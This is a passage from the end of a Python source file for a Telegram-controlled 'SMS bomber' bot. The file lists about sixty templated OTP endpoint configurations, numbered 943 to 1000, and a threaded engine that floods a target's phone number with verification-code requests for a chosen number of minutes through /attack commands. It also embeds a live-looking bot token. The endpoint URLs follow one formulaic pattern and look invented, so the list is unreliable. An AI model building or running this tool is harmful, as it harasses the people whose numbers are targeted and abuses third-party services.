    'url': 'https://api.news.copilot.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 943
{
    'name': 'Grammarly_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.grammarly.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 944
{
    'name': 'Hemingway_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.hemingway.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 945
{
    'name': 'ProWritingAid_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.prowritingaid.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 946
{
    'name': 'Quillbot_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.quillbot.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 947
{
    'name': 'Jasper_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.jasper.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 948
{
    'name': 'Copy.ai_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.copy.ai/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 949
{
    'name': 'Writesonic_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.writesonic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 950
{
    'name': 'Rytr_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rytr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 951
{
    'name': 'Anyword_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.anyword.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 952
{
    'name': 'Peppertype_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.peppertype.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 953
{
    'name': 'Frase_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.frase.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 954
{
    'name': 'SurferSEO_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.surferseo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 955
{
    'name': 'MarketMuse_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.marketmuse.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 956
{
    'name': 'Clearscope_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.clearscope.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 957
{
    'name': 'SEMrush_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.semrush.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 958
{
    'name': 'Ahrefs_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.ahrefs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 959
{
    'name': 'Moz_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.moz.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 960
{
    'name': 'SpyFu_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.spyfu.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 961
{
    'name': 'SimilarWeb_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.similarweb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 962
{
    'name': 'Alexa_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.alexa.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 963
{
    'name': 'Compete_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.compete.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 964
{
    'name': 'Quantcast_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.quantcast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 965
{
    'name': 'Comscore_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.comscore.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 966
{
    'name': 'Nielsen_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.nielsen.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 967
{
    'name': 'IRI_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.iri.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 968
{
    'name': 'NPD_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.npd.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 969
{
    'name': 'Gartner_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.gartner.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 970
{
    'name': 'Forrester_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.forrester.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 971
{
    'name': 'IDC_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.idc.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 972
{
    'name': 'Accenture_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.accenture.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 973
{
    'name': 'Deloitte_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.deloitte.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 974
{
    'name': 'PwC_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.pwc.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 975
{
    'name': 'EY_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.ey.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 976
{
    'name': 'KPMG_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.kpmg.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 977
{
    'name': 'McKinsey_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.mckinsey.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 978
{
    'name': 'BCG_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bcg.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 979
{
    'name': 'Bain_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bain.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 980
{
    'name': 'OliverWyman_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.oliverwyman.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 981
{
    'name': 'LEK_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.lek.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 982
{
    'name': 'Kearney_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.kearney.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 983
{
    'name': 'Strategy&_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.strategyand.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 984
{
    'name': 'RolandBerger_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rolandberger.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 985
{
    'name': 'ArthurDLittle_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.adlittle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 986
{
    'name': 'AlixPartners_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.alixpartners.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 987
{
    'name': 'FTI_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.fti.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 988
{
    'name': 'Navigant_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.navigant.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 989
{
    'name': 'PA_Consulting_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.paconsulting.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 990
{
    'name': 'BearingPoint_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bearingpoint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 991
{
    'name': 'Capgemini_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.capgemini.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 992
{
    'name': 'Atos_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.atos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 993
{
    'name': 'Cognizant_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.cognizant.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 994
{
    'name': 'Infosys_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.infosys.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 995
{
    'name': 'TCS_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.tcs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 996
{
    'name': 'Wipro_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.wipro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 997
{
    'name': 'HCL_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.hcl.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 998
{
    'name': 'Tech_Mahindra_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.techmahindra.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 999
{
    'name': 'LTI_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.lti.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 1000
{
    'name': 'Mphasis_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.mphasis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
]
        
    

# ===== TELEGRAM BOT CONFIG =====
try:
    import telebot as tb
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pytelegrambotapi", "-q"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import telebot as tb

BOT_TOKEN = '8467807885:AAENIbwr3u-tv5X70G8oYOV3vBKWLn1G4YY'
OWNER_USERNAME = 'Lucifer'
CHANNEL_USERNAME = 'chabnel nahi hai 😜'

bot = tb.TeleBot(BOT_TOKEN)

# ===== GLOBAL VARIABLES =====
active_bombs = {}
bombing_threads = {}

# ===== CORE BOMBING ENGINE =====
def call_api(api_config, phone):
    """Call individual API — returns True if success"""
    try:
        time.sleep(random.uniform(0.05, 0.15))
        method = api_config.get("method", "POST")
        headers = api_config.get("headers", {})
        data = None
        
        if "data" in api_config:
            raw = api_config["data"](phone)
            if isinstance(raw, dict):
                data = json.dumps(raw)
            else:
                data = raw

        if method.upper() == "POST":
            if "application/json" in str(headers.get("Content-Type", "")):
                r = requests.post(api_config["url"], headers=headers, json=json.loads(data) if data else {}, timeout=8)
            else:
                r = requests.post(api_config["url"], headers=headers, data=data, timeout=8)
        elif method.upper() == "PUT":
            r = requests.put(api_config["url"], headers=headers, json=json.loads(data) if data else {}, timeout=8)
        else:
            r = requests.get(api_config["url"], headers=headers, timeout=8)
        
        return r.status_code in [200, 201, 202, 204, 302]
    except:
        return False

def bombing_engine(chat_id, phone, minutes):
    """Main bombing loop — runs for given minutes"""
    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=minutes)
    total_sent = 0
    total_failed = 0
    batch_size = 20
    
    bot.send_message(chat_id, f"💀 *Attack LIVE!*\n📱 Target: `{phone}`\n⏱️ Duration: `{minutes} min`\n🚀 Workers: `{batch_size}`\n📡 APIs: `{len(APIS)}+`", parse_mode='Markdown')
    
    while datetime.now() < end_time and active_bombs.get(chat_id, {}).get('active', False):
        with ThreadPoolExecutor(max_workers=batch_size) as executor:
            futures = []
            available_apis = [api for api in APIS if api.get('type') == 'sms']
            
            for _ in range(batch_size):
                api = random.choice(available_apis) if available_apis else random.choice(APIS)
                futures.append(executor.submit(call_api, api, phone))
            
            for future in as_completed(futures):
                if not active_bombs.get(chat_id, {}).get('active', False):
                    break
                if future.result():
                    total_sent += 1
                else:
                    total_failed += 1
        
        # Status update every 30 sec
        if total_sent % 30 == 0 and total_sent > 0:
            remaining = max(0, int((end_time - datetime.now()).total_seconds() / 60))
            try:
                bot.send_message(
                    chat_id,
                    f"📊 *Progress*\n📨 Sent: `{total_sent}`\n⏱️ Failed: `{total_failed}`\n⏳ Remaining: `{remaining} min`",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        time.sleep(2)
    
    # Final report
    elapsed = (datetime.now() - start_time).total_seconds() / 60
    bot.send_message(
        chat_id,
        f"✅ *Attack Finished!*\n📱 Target: `{phone}`\n📨 Total Sent: `{total_sent}`\n⏱️ Failed: `{total_failed}`\n⏰ Duration: `{elapsed:.1f} min`\n🔥 *DEVILS WILL RISE!*",
        parse_mode='Markdown'
    )
    
    if chat_id in active_bombs:
        del active_bombs[chat_id]

# ===== BOT COMMANDS =====
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(
        message,
        f"🔥 *DEVILS WILL RISE — SMS BOMBER* 🔥\n👑 Owner: @{OWNER_USERNAME}\n📢 Channel: @{CHANNEL_USERNAME}\n\n"
        f"📌 *Commands:*\n"
        f"`/attack <10-digit phone> <minutes>` — Start bombing\n"
        f"`/stop` — Stop current attack\n"
        f"`/status` — Check active attack\n"
        f"`/apis` — Show loaded API count\n\n"
        f"💀 Example: `/attack 9876543210 5`",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['attack'])
def attack_command(message):
    chat_id = message.chat.id
    args = message.text.split()
    
    if chat_id in active_bombs and active_bombs[chat_id].get('active', False):
        bot.reply_to(message, "⚠️ *Attack already running!* Use /stop first.", parse_mode='Markdown')
        return
    
    if len(args) != 3:
        bot.reply_to(message, "❌ *Usage:* `/attack <phone> <minutes>`\nExample: `/attack 9876543210 5`", parse_mode='Markdown')
        return
    
    phone = args[1].strip()
    try:
        minutes = int(args[2])
        if minutes < 1:
            raise ValueError
    except:
        bot.reply_to(message, "❌ Minutes must be a positive integer (e.g., 5 for 5 minutes).", parse_mode='Markdown')
        return
    
    if not phone.isdigit() or len(phone) != 10:
        bot.reply_to(message, "❌ Invalid phone number! Send exactly 10 digits (e.g., 9876543210).", parse_mode='Markdown')
        return
    
    active_bombs[chat_id] = {
        'active': True,
        'phone': phone,
        'start_time': datetime.now(),
        'end_time': datetime.now() + timedelta(minutes=minutes)
    }
    
    thread = threading.Thread(
        target=bombing_engine,
        args=(chat_id, phone, minutes),
        daemon=True
    )
    thread.start()
    bombing_threads[chat_id] = thread
    
    bot.reply_to(
        message,
        f"💀 *Attack Launched!*\n📱 Target: `{phone}`\n⏱️ Duration: `{minutes} min`\n📡 APIs: `{len(APIS)}+`\n\nUse `/stop` to abort.",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['stop'])
def stop_command(message):
    chat_id = message.chat.id
    if chat_id in active_bombs and active_bombs[chat_id].get('active', False):
        active_bombs[chat_id]['active'] = False
        bot.reply_to(message, "🛑 *Attack stopped!*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ No active attack to stop.", parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    chat_id = message.chat.id
    if chat_id in active_bombs and active_bombs[chat_id].get('active', False):
        data = active_bombs[chat_id]
        remaining = max(0, int((data['end_time'] - datetime.now()).total_seconds() / 60))
        bot.reply_to(
            message,
            f"📊 *Attack Status*\n📱 Target: `{data['phone']}`\n⏳ Remaining: `{remaining} min`\n\nUse `/stop` to end.",
            parse_mode='Markdown'
        )
    else:
        bot.reply_to(message, "ℹ️ No active attack.", parse_mode='Markdown')

@bot.message_handler(commands=['apis'])
def apis_command(message):
    bot.reply_to(
        message,
        f"📡 *Loaded APIs:* `{len(APIS)}+`\n✅ All systems ready!",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: True)
def echo_all(message):
    bot.reply_to(
        message,
        "🤖 Use `/attack <phone> <minutes>` to start or `/stop` to halt.\nExample: `/attack 9876543210 5`",
        parse_mode='Markdown'
    )

# ===== BOT STARTUP =====
print(f'''
╔══════════════════════════════════════════════════╗
║      DEVILS WILL RISE — COMMAND BOMBER          ║
╠══════════════════════════════════════════════════╣
║   🔥 Bot Started Successfully!                  ║
║   👑 Owner: @{OWNER_USERNAME}                   ║
║   📢 Channel: @{CHANNEL_USERNAME}               ║
║   📊 Total APIs: {len(APIS)}+                   ║
║   🚀 Workers: 20 Parallel                       ║
║   📌 Commands: /attack, /stop, /status, /apis  ║
╚══════════════════════════════════════════════════╝
''')

if __name__ == "__main__":
    while True:
        try:
            bot.infinity_polling(timeout=30)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
